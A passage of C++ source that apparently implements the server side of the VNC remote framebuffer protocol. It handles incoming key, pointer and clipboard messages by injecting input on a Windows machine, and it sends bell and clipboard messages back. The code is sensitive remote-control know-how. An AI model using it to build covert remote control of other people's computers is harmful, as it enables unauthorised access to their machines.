        for(; i < dwWaitRectsCount; i++)if(prcWaitRects[i].wWidth == 0 && prcWaitRects[i].wHeight == 0)break;
        if(i == dwWaitRectsCount && !Mem::reallocEx(&prcWaitRects, sizeof(RECTANGLE) * (++dwWaitRectsCount)))goto END_LOOP;
        Mem::_copy(&prcWaitRects[i], &rect, sizeof(RECTANGLE));
        
        break;
      }

      /*
        A key press or release.
      */
      case 4: //KeyEvent
      {
        Rfb::EVENT_KEY ek;
        if(!WSocket::tcpRecvAll(s, &ek, sizeof(Rfb::EVENT_KEY), dwTimeout))goto END_LOOP;
        pCallbacks->onKeyEvent(pCallbacks->param, SWAP_DWORD(ek.dwKeyCode), (ek.bIsDown != 0));
        break;
      }

      /*
        Indicates either pointer movement or a pointer button press or release.
      */
      case 5: //PointerEvent
      {
        Rfb::EVENT_POINTER ep;
        if(!WSocket::tcpRecvAll(s, &ep, sizeof(Rfb::EVENT_POINTER), dwTimeout))goto END_LOOP;
        
        ep.wXPos = SWAP_WORD(ep.wXPos);
        ep.wYPos = SWAP_WORD(ep.wYPos);
        
        DWORD dwWheel = 0;
        DWORD dwFlags = MOUSEEVENTF_ABSOLUTE;
        bool bSwapped = (CWA(user32, GetSystemMetrics)(SM_SWAPBUTTON) != 0) ? true : false;

        //Перемещение курсора.
        if(ep.wXPos != epLast.wXPos || ep.wYPos != epLast.wYPos)dwFlags |= MOUSEEVENTF_MOVE;

        //Левая кнопка.
        if((ep.bButtonMask & MASK_POINTER_BUTTON_LEFT) != (epLast.bButtonMask & MASK_POINTER_BUTTON_LEFT))
        {
          if(ep.bButtonMask & MASK_POINTER_BUTTON_LEFT)dwFlags |= bSwapped ? MOUSEEVENTF_RIGHTDOWN : MOUSEEVENTF_LEFTDOWN;
          else dwFlags |= bSwapped ? MOUSEEVENTF_RIGHTUP : MOUSEEVENTF_LEFTUP;
        }
        
        //Правая кнопка.
        if((ep.bButtonMask & MASK_POINTER_BUTTON_RIGHT) != (epLast.bButtonMask & MASK_POINTER_BUTTON_RIGHT))
        {
          if(ep.bButtonMask & MASK_POINTER_BUTTON_RIGHT)dwFlags |= bSwapped ? MOUSEEVENTF_LEFTDOWN : MOUSEEVENTF_RIGHTDOWN;
          else dwFlags |= bSwapped ? MOUSEEVENTF_LEFTUP : MOUSEEVENTF_RIGHTUP;
        }

        //Средняя кнопка.
        if((ep.bButtonMask & MASK_POINTER_BUTTON_MIDDLE) != (epLast.bButtonMask & MASK_POINTER_BUTTON_MIDDLE))
        {
          dwFlags |= (ep.bButtonMask & MASK_POINTER_BUTTON_MIDDLE) ? MOUSEEVENTF_MIDDLEDOWN : MOUSEEVENTF_MIDDLEUP;
        }

        //Прокрутка вверх
        if((ep.bButtonMask & MASK_POINTER_WHEEL_UP)/* && (epLast.bButtonMask & MASK_POINTER_WHEEL_UP) == 0*/)
        {
          dwFlags |= MOUSEEVENTF_WHEEL;
          dwWheel  = WHEEL_DELTA;
        }

        //Прокрутка вниз
        if((ep.bButtonMask & MASK_POINTER_WHEEL_DOWN)/* && (epLast.bButtonMask & MASK_POINTER_WHEEL_DOWN) == 0*/)
        {
          dwFlags |= MOUSEEVENTF_WHEEL;
          dwWheel  = (DWORD)(-WHEEL_DELTA);
        }

        Mem::_copy(&epLast, &ep, sizeof(EVENT_POINTER));
        pCallbacks->OnPointerEvent(pCallbacks->param, dwFlags, ep.wXPos, ep.wYPos, dwWheel);
        break;
      }

      /*
        The client has new ISO 8859-1 (Latin-1) text in its cut buffer.
      */
      case 6: //ClientCutText
      {
        BYTE pad[3];
        DWORD dwLen;
        if(!WSocket::tcpRecvAll(s, pad, sizeof(pad), dwTimeout) || !WSocket::tcpRecvAll(s, &dwLen, sizeof(DWORD), dwTimeout))goto END_LOOP;

        dwLen = SWAP_DWORD(dwLen);

        LPSTR pStr = (LPSTR)Mem::alloc(dwLen + 1);
        if(pStr == NULL)
        {
          Mem::free(pStr);
          goto END_LOOP;
        }
        
        if(!WSocket::tcpRecvAll(s, pStr, dwLen, dwTimeout))goto END_LOOP;
        
        pCallbacks->OnClientCutText(pCallbacks->param, dwLen, pStr);
        Mem::free(pStr);
        break;
      }

      default: goto END_LOOP;
    }
  }

END_LOOP: 
  
  #if defined(WDEBUG0)
  WDEBUG0(WDDT_INFO, "Session stopped");
  #endif
  
  FreeINTERNAL_DATA(pInternalData);
  Mem::free(prcWaitRects);
}

bool Rfb::_SendBell(SOCKET s)
{
  BYTE bMsg = 2; //Bell
  return WSocket::tcpSend(s, &bMsg, sizeof(BYTE));
}

bool Rfb::_CopyText(SOCKET s, LPSTR pstrText)
{
  BYTE bMsg[4];
  *((LPDWORD)bMsg) = 0;
  bMsg[0] = 3; //ServerCutText
  return (WSocket::tcpSend(s, bMsg, sizeof(BYTE)) && SendANSIMessage(s, pstrText)) ? true : false;
}

#endif
